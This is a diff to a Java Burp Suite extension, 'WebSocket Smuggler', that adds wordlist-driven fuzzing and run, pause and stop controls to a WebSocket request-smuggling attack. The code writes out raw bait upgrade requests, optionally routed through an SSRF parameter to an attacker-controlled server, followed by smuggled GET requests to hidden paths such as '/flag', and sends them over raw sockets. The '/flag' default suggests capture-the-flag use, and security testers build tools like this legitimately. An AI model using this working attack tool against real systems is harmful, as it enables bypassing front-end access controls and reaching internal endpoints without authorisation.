@@ -40,13 +40,28 @@ public class WebSocketSmuggler implements BurpExtension, ContextMenuItemsProvide
     // Storage
     private Map<Integer, AttackLog> attackHistory = new ConcurrentHashMap<>();
 
+    // Wordlist & Target Storage
+    private List<String> loadedWordlist = new ArrayList<>();
+    private HttpRequestResponse targetRequest;
+
+    // Control Flags
+    private volatile boolean isRunning = false;
+    private volatile boolean isPaused = false;
+
     // UI Input Fields
     private JCheckBox ssrfToggle;
-    private JTextField simpleBaitPathField;      // E.g., /socket (Used when SSRF is OFF)
-    private JTextField ssrfInjectionPathField;   // E.g., /check-url?server= (Used when SSRF is ON)
-    private JTextField ssrfServerField;          // E.g., http://attacker:8000 (Used when SSRF is ON)
-    private JTextField smuggledPathField;        // E.g., /flag
-    private JTextField versionField;             // E.g., 777 or 13
+    private JTextField simpleBaitPathField;
+    private JTextField ssrfInjectionPathField;
+    private JTextField ssrfServerField;
+    private JTextField smuggledPathField;
+    private JTextField versionField;
+
+    // UI Buttons
+    private JButton loadWordlistBtn;
+    private JLabel wordlistStatusLabel;
+    private JButton runWordlistBtn;
+    private JButton pauseBtn;
+    private JButton stopBtn;
 
     static class AttackLog {
         HttpRequest request;
@@ -61,12 +76,12 @@ public class WebSocketSmuggler implements BurpExtension, ContextMenuItemsProvide
     @Override
     public void initialize(MontoyaApi api) {
         this.api = api;
-        api.extension().setName("WebSocket Smuggler (Modular)");
+        api.extension().setName("WebSocket Smuggler (Modular + Controls)");
 
         SwingUtilities.invokeLater(() -> {
             JPanel mainPanel = new JPanel(new BorderLayout());
 
-            // --- 1. CONFIG PANEL (Improved GridBagLayout) ---
+            // --- 1. CONFIG PANEL ---
             JPanel configPanel = new JPanel(new GridBagLayout());
             GridBagConstraints c = new GridBagConstraints();
             c.insets = new Insets(5, 5, 5, 5);
@@ -85,7 +100,7 @@ public class WebSocketSmuggler implements BurpExtension, ContextMenuItemsProvide
             c.gridx = 1;
             configPanel.add(simpleBaitPathField, c);
 
-            // --- SSRF Mode Fields (Disabled by default) ---
+            // --- SSRF Mode Fields ---
             ssrfInjectionPathField = new JTextField("/check-url?server=", 20);
             ssrfServerField = new JTextField("http://127.0.0.1:8000", 20);
 
@@ -99,21 +114,36 @@ public class WebSocketSmuggler implements BurpExtension, ContextMenuItemsProvide
             c.gridx = 1;
             configPanel.add(ssrfServerField, c);
 
-            // --- Common Fields ---
-            smuggledPathField = new JTextField("/flag", 20);
-            versionField = new JTextField("777", 5);
+            // --- Smuggled Path (Target for Wordlist) ---
+            smuggledPathField = new JTextField("/flag?id={PAYLOAD}", 20);
+            smuggledPathField.setToolTipText("Use {PAYLOAD} to insert wordlist item here");
 
             c.gridx = 0; c.gridy = 4;
             configPanel.add(new JLabel("Smuggled Path:"), c);
             c.gridx = 1;
             configPanel.add(smuggledPathField, c);
 
+            // --- Wordlist Selection ---
             c.gridx = 0; c.gridy = 5;
+            loadWordlistBtn = new JButton("Load Wordlist");
+            configPanel.add(loadWordlistBtn, c);
+
+            c.gridx = 1;
+            wordlistStatusLabel = new JLabel("No wordlist loaded");
+            configPanel.add(wordlistStatusLabel, c);
+
+            loadWordlistBtn.addActionListener(e -> loadWordlist());
+
+            // --- Version Field ---
+            versionField = new JTextField("777", 5);
+            c.gridx = 0; c.gridy = 6;
             configPanel.add(new JLabel("WS Version:"), c);
             c.gridx = 1;
             configPanel.add(versionField, c);
 
-            c.gridx = 0; c.gridy = 6;
+            // --- Action Buttons (Run, Pause, Stop, Clear) ---
+            JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
+
             JButton clearBtn = new JButton("Clear Results");
             clearBtn.addActionListener(e -> {
                 tableModel.setRowCount(0);
@@ -122,13 +152,32 @@ public class WebSocketSmuggler implements BurpExtension, ContextMenuItemsProvide
                 requestViewer.setRequest(HttpRequest.httpRequest(dummy, ByteArray.byteArray("")));
                 responseViewer.setResponse(HttpResponse.httpResponse(ByteArray.byteArray("")));
             });
-            configPanel.add(clearBtn, c);
 
-            // Initial state update and listener for toggle
+            runWordlistBtn = new JButton("Run Attack");
+            runWordlistBtn.setEnabled(false);
+            runWordlistBtn.addActionListener(e -> new Thread(this::performWordlistAttack).start());
+
+            pauseBtn = new JButton("Pause");
+            pauseBtn.setEnabled(false);
+            pauseBtn.addActionListener(e -> togglePause());
+
+            stopBtn = new JButton("Stop");
+            stopBtn.setEnabled(false);
+            stopBtn.addActionListener(e -> stopAttack());
+
+            buttonPanel.add(clearBtn);
+            buttonPanel.add(runWordlistBtn);
+            buttonPanel.add(pauseBtn);
+            buttonPanel.add(stopBtn);
+
+            c.gridx = 0; c.gridy = 7; c.gridwidth = 2;
+            configPanel.add(buttonPanel, c);
+
+            // Initial state
             toggleSSRFFields();
             ssrfToggle.addActionListener(e -> toggleSSRFFields());
 
-            // --- 2. TABLE AND EDITORS --- (Remaining UI setup is the same)
+            // --- 2. TABLE AND EDITORS ---
             String[] columns = {"ID", "Host", "Status", "Response 1", "Response 2", "Time"};
             tableModel = new DefaultTableModel(columns, 0) {
                 @Override public boolean isCellEditable(int row, int column) { return false; }
@@ -160,17 +209,65 @@ public class WebSocketSmuggler implements BurpExtension, ContextMenuItemsProvide
         });
 
         api.userInterface().registerContextMenuItemsProvider(this);
-        api.logging().logToOutput("WebSocket Smuggler (Modular) Loaded. Simple mode is default.");
+        api.logging().logToOutput("WebSocket Smuggler (Controls Added) Loaded.");
     }
 
-    // New helper to handle UI state based on checkbox
+    // --- Control Logic ---
+
+    private void togglePause() {
+        isPaused = !isPaused;
+        pauseBtn.setText(isPaused ? "Resume" : "Pause");
+        api.logging().logToOutput(isPaused ? "Attack Paused." : "Attack Resumed.");
+    }
+
+    private void stopAttack() {
+        isRunning = false; // This breaks the loop
+        isPaused = false;  // Ensure we don't get stuck in a pause loop
+        api.logging().logToOutput("Attack Stopped by User.");
+        setAttackUIState(false);
+    }
+
+    private void setAttackUIState(boolean active) {
+        SwingUtilities.invokeLater(() -> {
+            runWordlistBtn.setEnabled(!active && targetRequest != null && !loadedWordlist.isEmpty());
+            loadWordlistBtn.setEnabled(!active);
+            ssrfToggle.setEnabled(!active);
+
+            pauseBtn.setEnabled(active);
+            stopBtn.setEnabled(active);
+            pauseBtn.setText("Pause"); // Reset text on new run
+
+            // Re-check logic for run button if we just stopped
+            if (!active) checkRunButtonState();
+        });
+    }
+
+    private void loadWordlist() {
+        JFileChooser chooser = new JFileChooser();
+        int returnVal = chooser.showOpenDialog(null);
+        if(returnVal == JFileChooser.APPROVE_OPTION) {
+            File file = chooser.getSelectedFile();
+            loadedWordlist.clear();
+            try (BufferedReader br = new BufferedReader(new FileReader(file))) {
+                String line;
+                while ((line = br.readLine()) != null) {
+                    if(!line.trim().isEmpty()) loadedWordlist.add(line.trim());
+                }
+                wordlistStatusLabel.setText("Loaded: " + file.getName() + " (" + loadedWordlist.size() + " payloads)");
+                checkRunButtonState();
+            } catch (IOException ex) {
+                api.logging().logToError("Error loading wordlist: " + ex.getMessage());
+            }
+        }
+    }
+
+    private void checkRunButtonState() {
+        runWordlistBtn.setEnabled(targetRequest != null && !loadedWordlist.isEmpty() && !isRunning);
+    }
+
     private void toggleSSRFFields() {
         boolean isSSRF = ssrfToggle.isSelected();
-
-        // Disable simple mode field if SSRF is active
         simpleBaitPathField.setEnabled(!isSSRF);
-
-        // Enable SSRF-specific fields if SSRF is active
         ssrfInjectionPathField.setEnabled(isSSRF);
         ssrfServerField.setEnabled(isSSRF);
     }
@@ -185,10 +282,6 @@ public class WebSocketSmuggler implements BurpExtension, ContextMenuItemsProvide
             if (log != null) {
                 requestViewer.setRequest(log.request);
                 responseViewer.setResponse(log.response);
-            } else {
-                HttpService dummy = HttpService.httpService("localhost", 80, false);
-                requestViewer.setRequest(HttpRequest.httpRequest(dummy, ByteArray.byteArray("Waiting for attack to finish...")));
-                responseViewer.setResponse(HttpResponse.httpResponse(ByteArray.byteArray("")));
             }
         } catch (Exception ex) {}
     }
@@ -200,40 +293,89 @@ public class WebSocketSmuggler implements BurpExtension, ContextMenuItemsProvide
         item.addActionListener(e -> {
             List<HttpRequestResponse> selection = event.selectedRequestResponses();
             if (selection == null || selection.isEmpty()) return;
-            new Thread(() -> performAttack(selection.get(0))).start();
+
+            this.targetRequest = selection.get(0);
+            checkRunButtonState();
+            api.logging().logToOutput("Target set to: " + targetRequest.httpService().host());
+
+            // Run single probe (does not affect main loop controls)
+            new Thread(() -> performAttack(targetRequest, null)).start();
         });
         menuList.add(item);
         return menuList;
     }
 
-    private void performAttack(HttpRequestResponse baseRequest) {
+    private void performWordlistAttack() {
+        if (targetRequest == null || loadedWordlist.isEmpty()) return;
+
+        isRunning = true;
+        isPaused = false;
+        setAttackUIState(true);
+
+        try {
+            for (String payload : loadedWordlist) {
+
+                // 1. Check Stop Signal
+                if (!isRunning) break;
+
+                // 2. Check Pause Signal
+                while (isPaused && isRunning) {
+                    try { Thread.sleep(200); } catch (InterruptedException e) {}
+                }
+
+                // 3. Re-check Stop Signal (in case stopped while paused)
+                if (!isRunning) break;
+
+                performAttack(targetRequest, payload);
+
+                // Small delay to prevent UI freezing
+                try { Thread.sleep(50); } catch (InterruptedException e) {}
+            }
+        } finally {
+            isRunning = false;
+            isPaused = false;
+            setAttackUIState(false);
+            api.logging().logToOutput("Wordlist attack finished.");
+        }
+    }
+
+    private void performAttack(HttpRequestResponse baseRequest, String payloadOverride) {
         int id = requestIdCounter.getAndIncrement();
         String host = baseRequest.httpService().host();
         int port = baseRequest.httpService().port();
         boolean isSecure = baseRequest.httpService().secure();
         String timestamp = new SimpleDateFormat("HH:mm:ss").format(new Date());
 
-        // Read all inputs
-        String smuggledPath = smuggledPathField.getText();
         String wsVersion = versionField.getText();
         boolean useSSRF = ssrfToggle.isSelected();
 
-        // --- DETERMINE BAIT PATH BASED ON TOGGLE ---
+        // 1. Determine Bait Path
         String baitPathForRequest;
         if (useSSRF) {
             String injectionPath = ssrfInjectionPathField.getText();
             String ssrfServer = ssrfServerField.getText();
-            // SSRF Mode: GET /check-url?server=http://attacker
             baitPathForRequest = injectionPath + ssrfServer;
         } else {
-            // Simple Mode: GET /socket
             baitPathForRequest = simpleBaitPathField.getText();
+        }
+
+        // 2. Determine Smuggled Path - APPLY PAYLOAD HERE
+        String rawSmuggledPath = smuggledPathField.getText();
+        String finalSmuggledPath;
+
+        if (payloadOverride != null) {
+            if (rawSmuggledPath.contains("{PAYLOAD}")) {
+                finalSmuggledPath = rawSmuggledPath.replace("{PAYLOAD}", payloadOverride);
+            } else {
+                finalSmuggledPath = rawSmuggledPath + payloadOverride;
+            }
+        } else {
+            finalSmuggledPath = rawSmuggledPath.replace("{PAYLOAD}", "TEST");
         }
 
         SwingUtilities.invokeLater(() -> tableModel.addRow(new Object[]{id, host, "Testing...", "-", "-", timestamp}));
 
         try {
-            // --- CONSTRUCT THE FULL PAYLOAD ---
             String baitRequestStr =
                     "GET " + baitPathForRequest + " HTTP/1.1\r\n" +
                             "Host: " + host + ":" + port + "\r\n" +
@@ -244,13 +386,12 @@ public class WebSocketSmuggler implements BurpExtension, ContextMenuItemsProvide
                             "\r\n";
 
             String smuggledRequestStr =
-                    "GET " + smuggledPath + " HTTP/1.1\r\n" +
+                    "GET " + finalSmuggledPath + " HTTP/1.1\r\n" +
                             "Host: " + host + ":" + port + "\r\n" +
                             "\r\n";
 
             String fullRequestStr = baitRequestStr + smuggledRequestStr;
 
-            // --- EXECUTE RAW SOCKET ATTACK ---
             Socket socket;
             if (isSecure) {
                 SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
@@ -287,7 +428,6 @@ public class WebSocketSmuggler implements BurpExtension, ContextMenuItemsProvide
             } catch (Exception timeout) { }
             socket.close();
 
-            // --- SAVE & UPDATE ---
             byte[] fullResponseBytes = buffer.toByteArray();
             HttpRequest burpRequest = HttpRequest.httpRequest(baseRequest.httpService(), fullRequestStr);
             HttpResponse burpResponse = HttpResponse.httpResponse(ByteArray.byteArray(fullResponseBytes));
